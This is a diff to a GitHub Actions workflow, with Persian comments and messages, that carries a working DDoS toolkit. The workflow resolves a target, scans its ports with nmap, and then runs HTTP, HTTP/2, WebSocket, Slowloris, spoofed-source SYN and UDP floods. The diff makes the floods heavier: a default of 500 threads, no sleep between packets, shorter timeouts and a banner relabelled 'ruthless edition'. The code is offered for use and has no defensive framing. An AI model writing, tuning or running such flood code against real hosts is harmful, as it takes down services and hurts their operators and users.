@@ -29,7 +29,7 @@ on:
       threads:
         description: 'تعداد نخ‌ها'
         required: true
-        default: '100'
+        default: '500'
 
 permissions:
   contents: write
@@ -104,7 +104,6 @@ jobs:
               save_cache(cache)
               os.system(f"git add {CACHE_FILE} && git commit -m 'Update cache for {target_host}' && git push 2>/dev/null || true")
 
-          # ===== آمار زنده =====
           stats = {'sent': 0, 'success': 0, 'failed': 0, 'start_time': time.time(), 'lock': threading.Lock()}
           def increment(key, amount=1):
               with stats['lock']: stats[key] += amount
@@ -113,7 +112,6 @@ jobs:
                   elapsed = time.time() - stats['start_time']
                   return {'sent': stats['sent'], 'success': stats['success'], 'failed': stats['failed'], 'elapsed': elapsed, 'rps': stats['sent'] / elapsed if elapsed > 0 else 0}
 
-          # ===== شبکه =====
           def resolve_target(target):
               for prefix in ['https://', 'http://']:
                   if target.startswith(prefix): target = target[len(prefix):]
@@ -126,7 +124,7 @@ jobs:
 
           COMMON_HTTP_PORTS = [80, 443, 8080, 8443, 3000, 8000, 9000, 5000, 4000, 4443]
 
-          def check_port(ip, port, timeout=0.8):
+          def check_port(ip, port, timeout=0.5):
               try:
                   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                   sock.settimeout(timeout)
@@ -137,9 +135,9 @@ jobs:
                   return None
 
           def fast_http_scan(ip):
-              console.print("[cyan]⚡ اسکن سریع پورت‌های HTTP...[/cyan]")
+              console.print("[cyan]⚡ اسکن سریع پورت‌های HTTP (25 موازی)...[/cyan]")
               open_ports = []
-              with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+              with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
                   future_to_port = {executor.submit(check_port, ip, port): port for port in COMMON_HTTP_PORTS}
                   for future in concurrent.futures.as_completed(future_to_port):
                       port = future_to_port[future]
@@ -152,7 +150,7 @@ jobs:
               return open_ports
 
           def deep_scan_ports(ip):
-              console.print(f"[cyan]🔍 Nmap با سرعت بالا روی {ip}...[/cyan]")
+              console.print(f"[cyan]🔍 Nmap روی {ip}...[/cyan]")
               nm = nmap.PortScanner()
               nm.scan(hosts=ip, arguments=f'-sT -sV -p 1-20000 --min-rate 10000 --max-retries 0')
               open_ports = []
@@ -168,134 +166,106 @@ jobs:
               if attack_type.startswith('l7'):
                   ports = fast_http_scan(ip)
                   if ports:
-                      console.print(f"[green]⚡ {len(ports)} پورت HTTP با اسکن سریع پیدا شد.[/green]")
+                      console.print(f"[green]⚡ {len(ports)} پورت HTTP پیدا شد.[/green]")
                       return ports
                   else:
-                      console.print("[yellow]⚠️ اسکن سریع چیزی پیدا نکرد، Nmap عمیق انجام می‌شود...[/yellow]")
+                      console.print("[yellow]⚠️ رفتن به Nmap...[/yellow]")
               return deep_scan_ports(ip)
 
           USER_AGENTS = [
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
               "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:119.0) Gecko/20100101 Firefox/119.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-              "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
-              "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-              "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-              "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
           ]
-
-          def get_random_ua():
-              return random.choice(USER_AGENTS)
+          def get_random_ua(): return random.choice(USER_AGENTS)
 
           RANDOM_PATHS = [
-              "/", "/index.html", "/home", "/about", "/contact", "/api/v1/status", "/api/v2/users",
-              "/login", "/signup", "/search", "/products", "/categories", "/blog", "/news",
-              "/images/logo.png", "/css/style.css", "/js/app.js", "/favicon.ico", "/robots.txt",
-              "/sitemap.xml", "/feed", "/wp-admin/", "/wp-content/", "/.env", "/config",
-              "/api/v1/auth", "/api/v2/data", "/graphql", "/oauth/token", "/status",
-              "/health", "/ping", "/version", "/metrics", "/stats", "/analytics",
+              "/", "/index.html", "/home", "/about", "/contact", "/api/v1/status", "/login",
+              "/search", "/products", "/blog", "/news", "/robots.txt", "/sitemap.xml",
+              "/.env", "/config", "/graphql", "/health", "/ping", "/version",
           ]
+          def get_random_path(): return random.choice(RANDOM_PATHS)
 
-          def get_random_path():
-              return random.choice(RANDOM_PATHS)
+          # تزریق TCP_NODELAY برای کاهش تأخیر
+          def set_tcp_nodelay(sock):
+              try:
+                  sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+              except:
+                  pass
 
+          # ===== کارگرهای بهینه‌سازی‌شده =====
           async def http_worker_advanced(url, worker_id):
-              async with aiohttp.ClientSession() as session:
+              connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, force_close=False)
+              async with aiohttp.ClientSession(connector=connector) as session:
                   while True:
                       headers = {
                           "User-Agent": get_random_ua(),
-                          "Accept": random.choice(["text/html", "application/json", "*/*"]),
-                          "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7"]),
-                          "Accept-Encoding": "gzip, deflate, br",
-                          "Cache-Control": "no-cache",
+                          "Accept": "*/*",
                           "Connection": "keep-alive",
-                          "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                       }
-                      path = get_random_path()
                       try:
-                          async with session.get(url.rstrip('/') + path, headers=headers, timeout=8) as r:
+                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=4) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(random.uniform(0.005, 0.03))
+                      await asyncio.sleep(0.0001)  # تقریباً هیچ
 
           async def http2_worker_advanced(url, worker_id):
               import httpx
-              async with httpx.AsyncClient(http2=True, verify=False) as client:
+              async with httpx.AsyncClient(http2=True, verify=False, timeout=4.0) as client:
                   while True:
-                      headers = {"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded"}
-                      path = get_random_path()
+                      headers = {"User-Agent": get_random_ua()}
                       try:
-                          if random.random() > 0.5:
-                              r = await client.get(url.rstrip('/') + path, headers=headers, timeout=8)
-                          else:
-                              payload = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(100, 500)))}
-                              r = await client.post(url.rstrip('/') + path, headers=headers, data=payload, timeout=8)
+                          r = await client.get(url.rstrip('/') + get_random_path(), headers=headers)
                           increment('sent')
                           if r.status_code < 500: increment('success')
                           else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
-                      await asyncio.sleep(random.uniform(0.001, 0.01))
+                      await asyncio.sleep(0.0001)
 
           async def mixed_worker(url, worker_id):
               while True:
                   choice = random.randint(1, 10)
-                  if choice <= 4:
+                  if choice <= 3:
                       await http_worker_advanced(url, worker_id)
-                  elif choice <= 7:
+                  elif choice <= 6:
                       await http2_worker_advanced(url, worker_id)
-                  elif choice <= 9:
-                      try:
-                          import websockets
-                          ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://')
-                          async with websockets.connect(ws_url + get_random_path()) as ws:
-                              await ws.send('X' * random.randint(1024, 4096))
-                              increment('sent'); increment('success')
-                      except:
-                          increment('sent'); increment('failed')
-                      await asyncio.sleep(random.uniform(0.01, 0.1))
-                  else:
+                  elif choice <= 8:
+                      # Slowloris تهاجمی برای بالا بردن success
                       try:
                           parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
                           host = parsed.split(':')[0]
                           port = 443 if 'https' in url else 80
                           sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                          sock.settimeout(5)
+                          sock.settimeout(3)
+                          set_tcp_nodelay(sock)
                           sock.connect((host, port))
-                          sock.send(f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {get_random_ua()}\r\n".encode())
-                          sock.send(b"X-Header: " + b'X' * random.randint(100, 1000))
-                          time.sleep(random.uniform(5, 10))
-                          sock.close()
+                          sock.send(f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\n".encode())
+                          for _ in range(random.randint(3, 8)):
+                              sock.send(f"X-Slowloris-{_}: {random.randint(0,99999)}\r\n".encode())
+                              time.sleep(random.uniform(0.1, 0.5))
                           increment('sent'); increment('success')
+                          sock.close()
                       except:
                           increment('sent'); increment('failed')
+                  else:
+                      # WebSocket
+                      try:
+                          import websockets
+                          ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://')
+                          async with websockets.connect(ws_url + get_random_path(), extra_headers={"User-Agent": get_random_ua()}) as ws:
+                              await ws.send('X' * random.randint(1024, 8192))
+                              increment('sent'); increment('success')
+                      except:
+                          increment('sent'); increment('failed')
+                      await asyncio.sleep(0.0001)
 
           def syn_worker(ip, port):
               from scapy.all import IP, TCP, send
@@ -304,17 +274,13 @@ jobs:
                   pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
                   send(pkt, verbose=False)
                   increment('sent'); increment('success')
-                  time.sleep(0.0005)
+                  # بدون خواب
 
           def udp_worker(ip, port):
               sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
               while True:
-                  try:
-                      sock.sendto(random._urandom(random.randint(512, 2048)), (ip, port))
-                      increment('sent'); increment('success')
-                  except:
-                      increment('sent'); increment('failed')
-                  time.sleep(0.0005)
+                  sock.sendto(random._urandom(random.randint(1024, 4096)), (ip, port))
+                  increment('sent'); increment('success')
 
           def run_async_flood(worker_func, url, workers):
               loop = asyncio.new_event_loop()
@@ -335,7 +301,6 @@ jobs:
               table.add_row("⏱️ زمان", f"{s['elapsed']:.1f}s")
               return Panel(table, title="[bold green]🔥 آمار زنده حمله[/bold green]", border_style="green")
 
-          # ===== MAIN =====
           TARGET = os.environ["TARGET_HOST"]
           ATTACK = os.environ["ATTACK_TYPE"]
           DURATION = int(os.environ["DURATION"])
@@ -343,12 +308,12 @@ jobs:
           PORT_ARG = os.environ["TARGET_PORT"].strip().lower()
 
           console.print(f"[bold red]╔══════════════════════════════════════╗[/bold red]")
-          console.print(f"[bold red]║   🛡️  DDoS Toolkit - نسخه فوق سریع   ║[/bold red]")
+          console.print(f"[bold red]║   🛡️  DDoS Toolkit - نسخه بی‌رحم   ║[/bold red]")
           console.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]")
 
           ip = resolve_target(TARGET)
           if ip is None:
-              console.print("[red]❌ نمی‌تونم IP هدف رو پیدا کنم.[/red]")
+              console.print("[red]❌ نمی‌تونم IP رو پیدا کنم.[/red]")
               sys.exit(1)
           console.print(f"🎯 IP هدف: [bold cyan]{ip}[/bold cyan]")
 
@@ -356,13 +321,13 @@ jobs:
           cached_ports = get_cached_scan(ip)
           if cached_ports is not None and PORT_ARG == 'auto':
               target_ports = cached_ports
-              console.print("[green]♻️ استفاده از پورت‌های کش‌شده.[/green]")
+              console.print("[green]♻️ استفاده از کش.[/green]")
 
           if target_ports is None:
               if PORT_ARG == 'auto':
                   open_ports = discover_ports(ip, ATTACK)
                   if not open_ports:
-                      console.print("[red]❌ هیچ پورت بازی پیدا نشد.[/red]")
+                      console.print("[red]❌ پورتی پیدا نشد.[/red]")
                       sys.exit(1)
                   update_cache(ip, TARGET, open_ports)
                   target_ports = [p['port'] for p in open_ports]
@@ -379,15 +344,15 @@ jobs:
               console.print(f"[bold green]🚀 شروع حمله روی {base_url}[/bold green]")
               if ATTACK == 'l7_mixed_flood':
                   for _ in range(THREADS):
-                      t = threading.Thread(target=run_async_flood, args=(mixed_worker, base_url, 3))
+                      t = threading.Thread(target=run_async_flood, args=(mixed_worker, base_url, 2))
                       t.daemon = True; t.start()
               elif ATTACK == 'l7_http_flood':
                   for _ in range(THREADS):
-                      t = threading.Thread(target=run_async_flood, args=(http_worker_advanced, base_url, 5))
+                      t = threading.Thread(target=run_async_flood, args=(http_worker_advanced, base_url, 4))
                       t.daemon = True; t.start()
               elif ATTACK == 'l7_http2_flood':
                   for _ in range(THREADS):
-                      t = threading.Thread(target=run_async_flood, args=(http2_worker_advanced, base_url, 5))
+                      t = threading.Thread(target=run_async_flood, args=(http2_worker_advanced, base_url, 4))
                       t.daemon = True; t.start()
               elif ATTACK == 'l4_syn_flood':
                   for _ in range(THREADS):
